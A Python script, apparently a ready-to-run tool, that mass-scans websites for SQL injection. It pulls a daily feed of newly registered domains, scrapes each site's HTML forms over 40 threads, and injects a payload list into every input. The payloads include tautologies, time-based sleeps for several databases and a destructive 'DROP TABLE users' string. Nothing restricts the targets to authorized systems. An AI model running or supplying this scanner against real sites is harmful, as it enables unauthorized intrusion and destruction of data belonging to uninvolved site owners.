import io
import zipfile
import requests
import base64
import datetime
import re
import argparse
import ipaddress
import dns.resolver
from termcolor import colored
from intervaltree import Interval, IntervalTree
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed


def create_ip_interval_tree(ip_ranges):
    tree = IntervalTree()
    for cidr in ip_ranges:
        network = ipaddress.ip_network(cidr)
        start = int(network.network_address)
        end = int(network.broadcast_address)
        tree.addi(start, end + 1)  # Add 1 to the end because the interval is exclusive
    return tree


def is_ip_in_ranges(ip, tree):
    ip_int = int(ipaddress.ip_address(ip))
    return bool(tree[ip_int])


def is_ip_in_ranges(ip, tree):
    ip_int = int(ipaddress.ip_address(ip))
    return bool(tree[ip_int])

## IP RANGE STUFF


def read_ip_ranges(filepath):
    with open(filepath, "r") as file:
        return [line.strip() for line in file if line.strip() and not line.startswith("#")]
##


def get_ips_from_domain(domain):
    ipv4, ipv6 = None, None

    try:
        answers = dns.resolver.resolve(domain, "A")
        ipv4 = answers[0].to_text()
    except Exception as e:
        print(colored(f"Unable to resolve IPv4 for {domain}: {e}", "red"))

    try:
        answers = dns.resolver.resolve(domain, "AAAA")
        ipv6 = answers[0].to_text()
    except Exception as e:
        print(colored(f"Unable to resolve IPv6 for {domain}: {e}", "red"))

    return ipv4, ipv6


def test_sql_injection(url, param, payload, method="get", data=None):
    try:
        if method == "get":
            response = requests.get(url, params={param: payload}, timeout=5)
        elif method == "post":
            modified_data = data.copy()
            modified_data[param] = payload
            response = requests.post(url, data=modified_data, timeout=5)

        text = response.text.lower()

        error_patterns = {
            "mysql": [
                r"you have an error in your sql syntax",
                r"supplied argument is not a valid mysql result",
                r"unknown column",
            ],
            "oracle": [
                r"ora-\d{4,5}",
                r"sql command not properly ended",
                r"quoted string not properly terminated",
            ],
            "postgresql": [
                r"pg_query\(\): query failed: error",
                r"pg_exec\(\) \[nativecode=error",
                r"query failed \(\d{1,2}\: 0\) in",
            ],
            "microsoft sql server": [
                r"unclosed quotation mark after the character string",
                r"incorrect syntax near",
                r"statement has been terminated",
            ],
            "sqlite": [
                r"near \".+\"\: syntax error",
                r"sqlite3\..+error",
            ],
            "ibm db2": [
                r"db2 sql error",
                r"sqlcode=-\d+",
            ],
            "microsoft access": [
                r"syntax error in query expression",
                r"no query to execute",
                r"operation must use an updateable query",
            ],
            "mariadb": [
                r"you have an error in your sql syntax",
                r"supplied argument is not a valid mariadb result",
            ],
        }

        for engine, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, text):
                    print(colored(f"Detected SQL engine: {engine}", "green"))
                    return True
    except Exception as e:
        #print(e)
        pass

    return False


def find_vulnerable_params(url, test_cases):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()

            inputs = form.find_all("input")
            for input_tag in inputs:
                input_name = input_tag.get("name")
                if not input_name:
                    continue

                for payload in test_cases:
                    #print(f"Testing Payload: {payload} on {url} via {input_name}")
                    if method == "get":
                        is_vulnerable = test_sql_injection(url, input_name, payload, method)
                    elif method == "post":
                        data = {input_name: payload}
                        is_vulnerable = test_sql_injection(urljoin(url, action), input_name, payload, method, data)

                    if is_vulnerable:
                        print(colored(f"Vulnerable URL: {url} | Parameter: {input_name} | Payload: {payload}", "blue"))
                        return

    except Exception as e:
        #print(e)
        pass


def read_domains(filepath):
    with open(filepath, "r") as file:
        for line in file:
            yield line.strip()


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument(
        "--input", "-i", required=True, help="Path to the input file containing domains or IPs (local file) or 'download' to download the domain list"
    )
    args = parser.parse_args()
    if args.input.lower() == "download":
        date = str(datetime.date.today() - datetime.timedelta(days=1)) + ".zip"
        date = bytes(date, 'utf-8')
        date = date.decode('utf-8')
        date = date.encode('ascii')
        date = base64.b64encode(date)
        date = date.decode('ascii')

        url = "https://whoisds.com/whois-database/newly-registered-domains/" + date + "/nrd"
        print(url)
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0'}
        response = requests.get(url, headers=headers)

        zf = zipfile.ZipFile(io.BytesIO(response.content))
        domains_txt_file = zf.open("domain-names.txt")
        domains = [d.decode("utf-8").strip() for d in domains_txt_file.readlines()]
    else:
        domains = read_domains(args.input)

    test_cases = [
        # Generic test cases
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "') OR '1'='1",
        "' OR 1=1#",
        "') OR '1'='1 --",
        "') OR '1'='1#",

        # Time-based test cases
        "'; WAITFOR DELAY '0:0:5'--",  # SQL Server
        "'; SELECT pg_sleep(5); --",   # PostgreSQL
        "'; SELECT sleep(5); --",      # MySQL

        # Test cases for MySQL
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) #",

        # Test cases for Oracle
        "' AND (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'), 5) FROM dual))",
        "' AND (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'), 5) FROM dual)) --",
        "' AND (SELECT * FROM (SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'), 5) FROM dual)) #"
    ]

    IP_RANGES_TO_AVOID = read_ip_ranges("avoid.txt")
    ip_ranges_tree = create_ip_interval_tree(IP_RANGES_TO_AVOID)

    with ThreadPoolExecutor(max_workers=40) as executor:
        futures = []
        for domain in domains:
            ipv4, ipv6 = get_ips_from_domain(domain)

            if (ipv4 and not is_ip_in_ranges(ipv4, ip_ranges_tree)) or (ipv6 and not is_ip_in_ranges(ipv6, ip_ranges_tree)):
                futures.append(executor.submit(find_vulnerable_params, f"http://{domain}", test_cases))
                futures.append(executor.submit(find_vulnerable_params, f"https://{domain}", test_cases))
            else:
                print(colored(f"Skipping domain {domain} due to IP range restriction", "yellow"))


        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                #print(e)
                pass

if __name__ == "__main__":
    main()
